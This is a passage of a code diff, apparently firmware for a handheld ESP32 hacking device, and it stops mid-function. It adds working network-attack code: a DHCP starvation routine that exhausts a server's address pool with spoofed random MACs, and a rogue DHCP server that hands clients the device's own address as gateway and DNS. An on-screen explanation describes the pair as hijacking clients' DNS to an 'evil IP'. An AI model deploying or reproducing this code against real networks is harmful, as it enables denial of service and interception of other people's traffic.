+  packetRogue[17] = rogueIPRogue[1];
+  packetRogue[18] = rogueIPRogue[2];
+  packetRogue[19] = offeredIpSuffix;
+
+  // Display the allocated IP address
+  char allocatedIpMessage[50];
+  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d", rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
+  updateDisplay(allocatedIpMessage);
+
+  // Set the server IP address (siaddr)
+  packetRogue[20] = rogueIPRogue[0];
+  packetRogue[21] = rogueIPRogue[1];
+  packetRogue[22] = rogueIPRogue[2];
+  packetRogue[23] = rogueIPRogue[3];
+
+  // DHCP Magic cookie
+  packetRogue[236] = 0x63;
+  packetRogue[237] = 0x82;
+  packetRogue[238] = 0x53;
+  packetRogue[239] = 0x63;
+
+  // Start adding DHCP options
+  int optionIndexRogue = 240;
+
+  // DHCP Message Type (Option 53)
+  packetRogue[optionIndexRogue++] = 53;   // Option
+  packetRogue[optionIndexRogue++] = 1;    // Length
+  packetRogue[optionIndexRogue++] = messageTypeRogue; // Message Type
+
+  // Server Identifier (Option 54)
+  packetRogue[optionIndexRogue++] = 54;   // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[3];
+
+  // Subnet Mask (Option 1)
+  packetRogue[optionIndexRogue++] = 1;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[3];
+
+  // Router (Gateway) (Option 3)
+  packetRogue[optionIndexRogue++] = 3;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[3];
+
+  // DNS Server (Option 6)
+  packetRogue[optionIndexRogue++] = 6;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = currentDNSRogue[0];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[1];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[2];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[3];
+
+  // Lease Time (Option 51)
+  packetRogue[optionIndexRogue++] = 51;   // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = 0x00;
+  packetRogue[optionIndexRogue++] = 0x01;
+  packetRogue[optionIndexRogue++] = 0x51;
+  packetRogue[optionIndexRogue++] = 0x80; // 1-day lease time (86400 seconds)
+
+  // End Option
+  packetRogue[optionIndexRogue++] = 255;
+
+  // Update packet size
+  packetSizeRogue = optionIndexRogue;
+}
+
+void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue) {
+  // Send the packet to the client port (68)
+  udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
+  udp.write(packetRogue, packetSizeRogue);
+  udp.endPacket();
+}
+
+uint8_t allocateIpAddress(uint8_t *clientMac) {
+  // Check if this client already has an IP allocated
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    if (memcmp(clients[i].mac, clientMac, 6) == 0) {
+      // Client found, return the allocated IP suffix
+      return clients[i].ipSuffix;
+    }
+  }
+
+  // Client not found, allocate a new IP
+  for (int i = 0; i < numAvailableIps; i++) {
+    if (!ipAllocatedRogue[i]) {
+      ipAllocatedRogue[i] = true;
+      // Store the client info
+      for (int j = 0; j < MAX_CLIENTS; j++) {
+        if (clients[j].ipSuffix == 0) { // Empty slot
+          memcpy(clients[j].mac, clientMac, 6);
+          clients[j].ipSuffix = availableIpSuffixesRogue[i];
+          return clients[j].ipSuffix;
+        }
+      }
+    }
+  }
+  return 0; // No available IPs
+}
+
+
+void updateDisplay(const char* message) {
+  // Add the new message to the array
+  displayLinesRogue[currentLineRogue] = String(message);
+  currentLineRogue = (currentLineRogue + 1) % maxLinesRogue;
+
+  // Clear the screen
+  tft.fillScreen(menuBackgroundColor);
+
+  // Display the last lines
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  int y = 10;
+  for (int i = 0; i < maxLinesRogue; i++) {
+    int index = (currentLineRogue - i - 1 + maxLinesRogue) % maxLinesRogue;
+    if (!displayLinesRogue[index].isEmpty()) {
+      tft.setCursor(0, y);
+      tft.println(displayLinesRogue[index]);
+      y += 16;
+    }
+  }
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+uint32_t totalIPs = 0;
+
+uint32_t calculateTotalIPs(IPAddress subnetMask) {
+  uint32_t mask = ((uint32_t)subnetMask[0] << 24) | ((uint32_t)subnetMask[1] << 16) | ((uint32_t)subnetMask[2] << 8) | subnetMask[3];
+  uint8_t prefixLength = 0;
+  for (int i = 0; i < 32; i++) {
+    if (mask & (1UL << (31 - i))) {
+      prefixLength++;
+    } else {
+      break;
+    }
+  }
+  uint8_t hostBits = 32 - prefixLength;
+  uint32_t totalIPs = 1UL << hostBits;
+  return totalIPs;
+}
+
+IPAddress currentIPStarvation;
+IPAddress currentSubnet;
+IPAddress currentGateway;
+IPAddress currentDNS;
+
+// DHCP variables
+IPAddress broadcastIP(255, 255, 255, 255);
+uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
+IPAddress dhcpServerIP;
+bool dhcpServerDetected = false;
+
+unsigned int localUdpPortStarvation = 67;
+
+uint32_t discoverCount = 0;
+uint32_t offerCount = 0;
+uint32_t requestCount = 0;
+uint32_t ackCount = 0;
+uint32_t nakCount = 0;
+IPAddress lastAssignedIP;
+
+void saveCurrentNetworkConfig() {
+  currentIPStarvation = WiFi.localIP();
+  currentSubnet = WiFi.subnetMask();
+  currentGateway = WiFi.gatewayIP();
+  currentDNS = WiFi.dnsIP();
+
+  totalIPs = calculateTotalIPs(currentSubnet);
+
+  Serial.println("Current network saved:");
+  Serial.print("IP: ");
+  Serial.println(currentIPStarvation);
+  Serial.print("Subnet mask: ");
+  Serial.println(currentSubnet);
+  Serial.print("Gateway: ");
+  Serial.println(currentGateway);
+  Serial.print("DNS: ");
+  Serial.println(currentDNS);
+
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 0);
+  tft.println("Current network saved:");
+  tft.printf("IP: %s\n", currentIPStarvation.toString().c_str());
+  tft.printf("Subnet: %s\n", currentSubnet.toString().c_str());
+  tft.printf("Gateway: %s\n", currentGateway.toString().c_str());
+  tft.printf("DNS: %s\n", currentDNS.toString().c_str());
+
+  delay(2000);
+}
+
+void disconnectWiFi() {
+  WiFi.disconnect(true);
+  Serial.println("WiFi disconnected.");
+
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 0);
+  tft.println("WiFi disconnected.");
+
+  delay(1000);
+}
+
+void configureStaticIP() {
+  if (!WiFi.config(currentIPStarvation, currentGateway, currentSubnet, currentDNS)) {
+    Serial.println("Failed to configure static IP.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Failed to configure\n static IP.");
+
+    delay(2000);
+  } else {
+    Serial.println("Static IP configured successfully.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Static IP configured \nsuccessfully.");
+
+    delay(1000);
+  }
+}
+
+void reconnectWiFi(int networkIndex) {
+  Serial.println("Reconnecting to WiFi...");
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 0);
+  tft.println("Reconnecting to WiFi...");
+
+
+  if (getWifiSecurity(networkIndex) == "Open") {
+    Serial.println("Network is open, no password required.");
+    WiFi.begin(ssid.c_str()); // Connexion sans mot de passe
+  } else {
+    Serial.println("Network requires a password.");
+    WiFi.begin(ssid.c_str(), password.c_str());
+  }
+
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+    tft.print(".");
+
+  }
+
+  Serial.println("\nConnected to WiFi.");
+  tft.println("\nConnected to WiFi.");
+
+  delay(1000);
+}
+
+
+
+void detectDHCPServer() {
+  unsigned long startMillis = millis();
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 0);
+  tft.println("Detecting DHCP server...");
+  tft.println("Press ENTER to cancel");
+
+  dhcpServerDetected = false;
+
+  while (millis() - startMillis < 16000) { // Maximum wait time of 16 seconds
+
+
+    TouchPoint touch = ts.getTouch();
+    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+      Serial.println("Detection cancelled by user");
+      tft.fillScreen(menuBackgroundColor);
+      tft.setCursor(0, 0);
+      tft.printf("Detection cancelled");
+
+      delay(2000);
+      return;
+    }
+
+    sendDHCPDiscover(macBase); // Send DHCP Discover request
+
+    // Wait for response for 5 seconds
+    unsigned long responseStartMillis = millis();
+    while (millis() - responseStartMillis < 5000) {
+      int packetSize = udp.parsePacket();
+      if (packetSize > 0) {
+        uint8_t packetBuffer[512];
+        udp.read(packetBuffer, packetSize);
+
+        uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
+        if (messageType == 2) { // DHCP Offer
+          dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);
+
+          // Check if the detected DHCP server is 0.0.0.0
+          if (dhcpServerIP.toString() == "0.0.0.0") {
+            Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
+            dhcpServerIP = currentGateway;
+          }
+
+          Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
+          tft.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
+
+          dhcpServerDetected = true;
+          delay(2000);
+          return; // DHCP server found
+        }
+      }
+    }
+  }
+
+  if (!dhcpServerDetected) {
+    // Fallback to using the gateway as the DHCP server
+    dhcpServerIP = currentGateway;
+    Serial.println("No DHCP server detected. Using gateway as fallback.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.println("No DHCP server found.");
+    tft.println("Using gateway as fallback:");
+    tft.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
+
+    delay(2000);
+  }
+}
+
+
+
+
+int percentage = 0;
+bool NAKFlagStarvation = false;
+int NAKNumberStarvation = 50;
+
+void startDHCPStarvation() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  discoverCount = 0;
+  offerCount = 0;
+  requestCount = 0;
+  ackCount = 0;
+  nakCount = 0;
+
+  saveCurrentNetworkConfig();
+  if (totalIPs == 0) {
+    Serial.println("Error: Total IPs calculated as zero.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
+    totalIPs == 255;
+
+    delay(2000);
+  }
+  disconnectWiFi();
+  configureStaticIP();
+  reconnectWiFi(currentListIndex);
+  randomSeed(analogRead(0)); // Initialize random generator
+
+  if (!udp.begin(68)) {
+    Serial.println("Error: Failed to initialize UDP socket on port 68.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Error: Failed to init \nUDP socket");
+
+    delay(2000);
+    return;
+  }
+
+  Serial.println("System initialized. Ready to detect DHCP server...");
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 0);
+  tft.println("System initialized");
+  tft.println("Starting DHCP detection...");
+
+  delay(1000);
+
+  detectDHCPServer();
+  if (dhcpServerDetected) {
+    Serial.println("DHCP server detected. Starting DHCP Starvation attack...");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Starvation running on:");
+    tft.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
+
+  } else {
+    Serial.println("No DHCP server detected. Trying with broadcast.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 0);
+    tft.println("Starvation running on:");
+    tft.printf("Unknow DHCP server");
+
+  }
+
+  uint16_t i = 0;
+  while (nakCount < NAKNumberStarvation) {
+
+
+    TouchPoint touch = ts.getTouch();
+    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+      Serial.println("Attack stopped by user");
+      tft.println("Attack stopped");
+
+      delay(1000);
+      break;
+    }
+
+    generateRandomMAC(macBase, i); // Generate random MAC address
+    completeDHCPTransaction(macBase); // Perform complete DHCP transaction
+
+    float progress = (float)ackCount / totalIPs;
+    percentage = (int)(progress * 100.0);
+    // Update display with statistics
+    tft.fillRect(0, 50, tft.width(), 50, menuBackgroundColor);
+    tft.setCursor(0, 50);
+    tft.printf("Pool percentage: %d%%\n", percentage);
+    tft.printf("Send Discover: %d\n", discoverCount);
+    tft.printf("Received Offer: %d\n", offerCount);
+    tft.printf("Send Request: %d\n", requestCount);
+    tft.printf("Received ACK: %d\n", ackCount);
+    tft.printf("Received NAK: %d\n", nakCount);
+    tft.print("Last IP:");
+    tft.print(lastAssignedIP.toString().c_str());
+    tft.print("        ");
+    i++;
+  }
+  if (nakCount >= NAKNumberStarvation ) {
+    Serial.println("The number of NAK suggest a successfull Starvation.");
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 30);
+    tft.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");
+
+    delay(4000);
+  }
+  Serial.println("DHCP Starvation attack completed.");
+  tft.fillScreen(menuBackgroundColor);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  tft.setCursor(0, 30);
+  tft.println("DHCP Starvation Stopped.");
+  tft.printf("Pool percentage: %d%%\n", percentage);
+  tft.printf("Total Discover: %d\n", discoverCount);
+  tft.printf("Total Offer: %d\n", offerCount);
+  tft.printf("Total Request: %d\n", requestCount);
+  tft.printf("Total ACK: %d\n", ackCount);
+  tft.printf("Total NAK: %d\n", nakCount);
+
+  delay(4000);
+  waitAndReturnToMenu("Return to menu");
+}
+
+const uint8_t knownOUI[][3] = {
+  {0x00, 0x1A, 0x2B}, // Cisco
+  {0x00, 0x1B, 0x63}, // Apple
+  {0x00, 0x1C, 0x4D}, // Intel
+  {0xAC, 0xDE, 0x48}, // Broadcom
+  {0xD8, 0x3C, 0x69}, // Huawei
+  {0x3C, 0xA0, 0x67}, // Samsung
+  {0xB4, 0x86, 0x55}, // Xiaomi
+  {0xF4, 0x28, 0x53}, // TP-Link
+  {0x00, 0x25, 0x9C}, // Dell
+  {0x00, 0x16, 0xEA}, // LG Electronics
+  {0x00, 0x1E, 0xC2}, // Sony
+  {0x50, 0xCC, 0xF8}, // Microsoft
+  {0x00, 0x24, 0xE8}, // ASUS
+  {0x88, 0x32, 0x9B}, // Hewlett Packard
+  {0x00, 0x26, 0xBB}, // Lenovo
+  {0x78, 0xD7, 0xF7}, // Realtek Semiconductor
+  {0xBC, 0x92, 0x6B}, // Xiaomi Communications
+  {0x84, 0xA8, 0xE4}, // OnePlus Technology
+  {0xD4, 0x25, 0x8B}, // Oppo Mobile
+  {0x8C, 0x5A, 0xF0}, // Amazon Technologies
+  {0xAC, 0x3C, 0x0B}, // Google
+  {0x00, 0x17, 0xF2}, // Philips Lighting
+  {0x00, 0x1D, 0x7E}, // Motorola
+  {0xF8, 0x16, 0x54}, // ZTE Corporation
+  {0xE8, 0x94, 0xF6}, // Vivo Mobile
+  {0xF4, 0x09, 0xD8}, // Netgear
+  {0x00, 0x0F, 0xB5}, // Buffalo
+  {0x40, 0x16, 0x7E}, // PlayStation
+  {0x68, 0x5B, 0x35}, // Nintendo
+  {0xF4, 0x6D, 0x04}, // Fitbit
+  {0x00, 0x1E, 0x3D}, // Blackberry
+  {0x24, 0xD4, 0x42}, // Razer
+  {0x4C, 0x32, 0x75}, // Logitech
+  {0x74, 0x83, 0xEF}, // Roku
+  {0x28, 0xA1, 0x83}, // Alienware (Dell)
+  {0xB8, 0x27, 0xEB}, // Raspberry Pi Foundation
+  {0x44, 0x65, 0x0D}, // Aruba Networks
+  {0x38, 0xFF, 0x36}, // Juniper Networks
+  {0x00, 0x23, 0x6C}  // Panasonic
+};
+
+void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
+  // Select random OUI
+  uint8_t index = random(0, sizeof(knownOUI) / sizeof(knownOUI[0]));
+  mac[0] = knownOUI[index][0];
+  mac[1] = knownOUI[index][1];
+  mac[2] = knownOUI[index][2];
+
+  // Generate last 3 bytes randomly
+  mac[3] = random(0x00, 0xFF);
+  mac[4] = random(0x00, 0xFF);
+  mac[5] = random(0x00, 0xFF);
+}
+
+const char* fixedHostname = "Evil-Client";
+
+void sendDHCPDiscover(uint8_t *mac) {
+  uint8_t dhcpDiscover[300] = {0};
+  int index = 0;
+
+  // Ethernet Header
+  dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
+  dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
+  dhcpDiscover[index++] = 0x06; // HLEN: MAC address length
+  dhcpDiscover[index++] = 0x00; // HOPS: 0
+
+  // Transaction ID
+  uint32_t xid = random(1, 0xFFFFFFFF); // Ensure xid is not zero
+  dhcpDiscover[index++] = (xid >> 24) & 0xFF;
+  dhcpDiscover[index++] = (xid >> 16) & 0xFF;
+  dhcpDiscover[index++] = (xid >> 8) & 0xFF;
+  dhcpDiscover[index++] = xid & 0xFF;
+
+  // Seconds and Flags
+  dhcpDiscover[index++] = 0x00; // Seconds
+  dhcpDiscover[index++] = 0x00;
+  dhcpDiscover[index++] = 0x80; // Flags (Broadcast)
+  dhcpDiscover[index++] = 0x00;
+
+  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
+  for (int i = 0; i < 16; i++) {
+    dhcpDiscover[index++] = 0x00;
+  }
+
+  // Client MAC Address (chaddr)
+  for (int i = 0; i < 6; i++) {
+    dhcpDiscover[index++] = mac[i];
+  }
+  for (int i = 0; i < 10; i++) {
+    dhcpDiscover[index++] = 0x00; // Padding to make chaddr 16 bytes
+  }
+
+  // sname: Server Host Name (64 bytes)
+  for (int i = 0; i < 64; i++) {
+    dhcpDiscover[index++] = 0x00;
+  }
+
+  // file: Boot File Name (128 bytes)
+  for (int i = 0; i < 128; i++) {
+    dhcpDiscover[index++] = 0x00;
+  }
+
+  // DHCP Magic Cookie
+  dhcpDiscover[index++] = 0x63;
+  dhcpDiscover[index++] = 0x82;
+  dhcpDiscover[index++] = 0x53;
+  dhcpDiscover[index++] = 0x63;
+
+  // DHCP Options
+  dhcpDiscover[index++] = 53; // DHCP Message Type Option
+  dhcpDiscover[index++] = 1;  // Length
+  dhcpDiscover[index++] = 1;  // DHCP Discover
+
+  // Host Name Option (12)
+  dhcpDiscover[index++] = 12;               // Option 12: Host Name
+  dhcpDiscover[index++] = strlen(fixedHostname); // Length of the host name
+  for (size_t i = 0; i < strlen(fixedHostname); i++) {
+    dhcpDiscover[index++] = fixedHostname[i];  // Add the host name characters
+  }
+
+
+  dhcpDiscover[index++] = 55; // Parameter Request List
+  dhcpDiscover[index++] = 4;  // Length
+  dhcpDiscover[index++] = 1;  // Subnet Mask
+  dhcpDiscover[index++] = 3;  // Router
+  dhcpDiscover[index++] = 6;  // DNS Server
+  dhcpDiscover[index++] = 15; // Domain Name
+  dhcpDiscover[index++] = 255; // End Option
+
+  // Send the packet
+  if (udp.beginPacket(broadcastIP, 67)) {
+    udp.write(dhcpDiscover, index);
+    udp.endPacket();
+    discoverCount++;
+    Serial.println("Sent DHCP Discover with Host Name...");
+  } else {
+    Serial.println("Failed to send DHCP Discover.");
+    tft.setCursor(0, tft.height() - 40);
+    tft.println("Failed to send DHCP Discover");
+
+  }
+}
+
+void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
+  uint8_t dhcpRequest[300] = {0};
+  int index = 0;
+
+  // Ethernet Header
+  dhcpRequest[index++] = 0x01; // OP: BOOTREQUEST
+  dhcpRequest[index++] = 0x01; // HTYPE: Ethernet
+  dhcpRequest[index++] = 0x06; // HLEN: MAC address length
+  dhcpRequest[index++] = 0x00; // HOPS: 0
+
+  // Transaction ID
+  uint32_t xid = random(1, 0xFFFFFFFF); // Unique transaction ID
+  dhcpRequest[index++] = (xid >> 24) & 0xFF;
+  dhcpRequest[index++] = (xid >> 16) & 0xFF;
+  dhcpRequest[index++] = (xid >> 8) & 0xFF;
+  dhcpRequest[index++] = xid & 0xFF;
+
+  // Seconds and Flags
+  dhcpRequest[index++] = 0x00; // Seconds
+  dhcpRequest[index++] = 0x00;
+  dhcpRequest[index++] = 0x80; // Flags (Broadcast)
+  dhcpRequest[index++] = 0x00;
+
+  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
+  for (int i = 0; i < 16; i++) {
+    dhcpRequest[index++] = 0x00;
+  }
+
+  // Client MAC Address (chaddr)
+  for (int i = 0; i < 6; i++) {
+    dhcpRequest[index++] = mac[i];
+  }
+  for (int i = 0; i < 10; i++) {
+    dhcpRequest[index++] = 0x00; // Padding to make chaddr 16 bytes
+  }
+
+  // sname: Server Host Name (64 bytes)
+  for (int i = 0; i < 64; i++) {
+    dhcpRequest[index++] = 0x00;
+  }
+
+  // file: Boot File Name (128 bytes)
+  for (int i = 0; i < 128; i++) {
+    dhcpRequest[index++] = 0x00;
+  }
+
+  // DHCP Magic Cookie
+  dhcpRequest[index++] = 0x63;
+  dhcpRequest[index++] = 0x82;
+  dhcpRequest[index++] = 0x53;
+  dhcpRequest[index++] = 0x63;
+
+  // DHCP Options
+  dhcpRequest[index++] = 53; // DHCP Message Type Option
+  dhcpRequest[index++] = 1;  // Length
+  dhcpRequest[index++] = 3;  // DHCP Request
+
+  // Requested IP Address Option
+  dhcpRequest[index++] = 50; // Requested IP Address
+  dhcpRequest[index++] = 4;  // Length
+  dhcpRequest[index++] = offeredIP[0];
+  dhcpRequest[index++] = offeredIP[1];
+  dhcpRequest[index++] = offeredIP[2];
+  dhcpRequest[index++] = offeredIP[3];
+
+  // DHCP Server Identifier Option
+  dhcpRequest[index++] = 54; // DHCP Server Identifier
+  dhcpRequest[index++] = 4;  // Length
+  dhcpRequest[index++] = dhcpServerIP[0];
+  dhcpRequest[index++] = dhcpServerIP[1];
+  dhcpRequest[index++] = dhcpServerIP[2];
+  dhcpRequest[index++] = dhcpServerIP[3];
+
+  // Host Name Option (12)
+  dhcpRequest[index++] = 12;               // Option 12: Host Name
+  dhcpRequest[index++] = strlen(fixedHostname); // Length of the host name
+  for (size_t i = 0; i < strlen(fixedHostname); i++) {
+    dhcpRequest[index++] = fixedHostname[i];  // Add the host name characters
+  }
+
+  dhcpRequest[index++] = 255; // End Option
+
+  // Send the packet
+  if (udp.beginPacket(broadcastIP, 67)) {
+    udp.write(dhcpRequest, index);
+    udp.endPacket();
+    requestCount++;
+    Serial.println("Sent DHCP Request with Host Name...");
+  } else {
+    Serial.println("Failed to send DHCP Request.");
+    tft.setCursor(0, tft.height() - 40);
+    tft.println("Failed to send DHCP Request");
+
+  }
+}
+
+// Complete DHCP Transaction
+void completeDHCPTransaction(uint8_t *mac) {
+  sendDHCPDiscover(mac);
+  Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");
+
+  unsigned long offerWaitStart = millis();
+  while (millis() - offerWaitStart < 2000) {
+    int packetSize = udp.parsePacket();
+    if (packetSize > 0) {
+      uint8_t packetBuffer[512];
+      udp.read(packetBuffer, packetSize);
+
+      uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
+      if (messageType == 6) { // DHCP NAK
+        nakCount++;
+        Serial.println("Received DHCP NAK");
+        return;
+      } else if (messageType == 2) { // DHCP Offer
+        offerCount++;
+        IPAddress offeredIP(packetBuffer[16], packetBuffer[17], packetBuffer[18], packetBuffer[19]);
+        Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
+        lastAssignedIP = offeredIP;
+
+        sendDHCPRequest(mac, offeredIP, dhcpServerIP);
+
+        unsigned long ackWaitStart = millis();
+        while (millis() - ackWaitStart < 2000) {
+          int ackPacketSize = udp.parsePacket();
+          if (ackPacketSize > 0) {
+            udp.read(packetBuffer, ackPacketSize);
+
+            uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackPacketSize);
+            if (ackMessageType == 5) { // DHCP ACK
+              ackCount++;
+              Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
+              return;
+            } else if (ackMessageType == 6) { // DHCP NAK
+              nakCount++;
+              Serial.println("Received DHCP NAK");
+              return;
+            }
+          }
+        }
+        Serial.println("No DHCP ACK received.");
+        return;
+      }
+    }
+  }
+  Serial.println("No DHCP Offer received.");
+}
+
+// DHCP packet analysis
+uint8_t parseDHCPMessageType(uint8_t *packet, int packetSize) {
+  if (packetSize < 244 || packet[236] != 0x63 || packet[237] != 0x82 || packet[238] != 0x53 || packet[239] != 0x63) {
+    return 0; // Not a DHCP packet
+  }
+  for (int i = 240; i < packetSize; i++) {
+    if (packet[i] == 53 && packet[i + 1] == 1) {
+      return packet[i + 2];
+    }
+  }
+  return 0;
+}
+
+void switchDNS() {
+  ipAP = WiFi.softAPIP();
+  ipSTA = WiFi.localIP();
+  dnsServer.stop();  // Stop the current DNS server
+  useAP = !useAP;    // Toggle between AP and STA modes
+  IPAddress newIP = useAP ? ipAP : ipSTA;
+  dnsServer.start(DNS_PORT, "*", newIP);  // Restart the DNS server with the new IP
+  Serial.print("DNS restarted with IP: ");
+  Serial.println(newIP);
+
+  // Build the message with the current DNS IP
+  String message = "DNS reset, new IP: \n" + newIP.toString();
+  waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
+}
+
+
+void rogueDHCPAuto() {
+  rogueIPRogue = WiFi.localIP();
+  currentSubnetRogue = WiFi.subnetMask();
+  currentGatewayRogue = WiFi.localIP();
+  currentDNSRogue = WiFi.localIP();
+
+  udp.begin(localUdpPort);
+
+  tft.fillScreen(menuBackgroundColor);
+  Serial.println("Rogue DHCP running...");
+  updateDisplay("DHCP running...");
+
+  unsigned long startTime = millis(); // Enregistrer le temps de début
+
+  while (millis() - startTime < 15000) { // Boucle pendant 15 secondes
+
+
+    handleDnsRequestSerial();
+
+    int packetSizeRogue = udp.parsePacket();
+    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
+      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
+      updateDisplay("Packet received");
+
+      uint8_t packetBufferRogue[512];
+      udp.read(packetBufferRogue, packetSizeRogue);
+
+      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
+
+      if (messageTypeRogue == 1) { // DHCP Discover
+        Serial.println("DHCP Discover received. Preparing Offer...");
+        updateDisplay("Discover. Preparing Offer...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
+
+        // Send the DHCP Offer
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP Offer sent.");
+        updateDisplay("Offer sent.");
+
+      } else if (messageTypeRogue == 3) { // DHCP Request
+        Serial.println("DHCP Request received. Preparing ACK...");
+        updateDisplay("Request. Preparing ACK...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
+
+        // Send the DHCP ACK
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP ACK sent.");
+        updateDisplay("ACK sent.");
+      }
+    }
+  }
+  updateDisplay("Rogue DHCP stopped.");
+}
+
+
+void DHCPAttackAuto() {
+  bool DHCPDNSExplain = false;
+  if (confirmPopup("Some explanation ?")) {
+    DHCPDNSExplain = true;
+  }
+  if (DHCPDNSExplain) {
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 20);
+    tft.println("Step 1 : DHCP Starvation.");
+    tft.println("Send multiple fake new");
+    tft.println("client to saturate the");
+    tft.println("the pool of available");
+    tft.println("IP address that DHCP can");
+    tft.println("provide. NAK = Starvation");
+    tft.println("Press Enter to start");
+
+    while (true) {
+      TouchPoint touch = ts.getTouch();
+      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+        break;
+      }
+      delay(100);
+    }
+  }
+  startDHCPStarvation();
+  screenDebounce();
+  if (DHCPDNSExplain) {
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 20);
+    tft.println("Step 2 : Rogue DHCP.");
+    tft.println("The Original DHCP cant");
+    tft.println("provide new IP so we");
+    tft.println("now answering any DHCP");
+    tft.println("request with hijacked");
+    tft.println("DNS that at evil IP.");
+    tft.println("Press Enter to start");
+
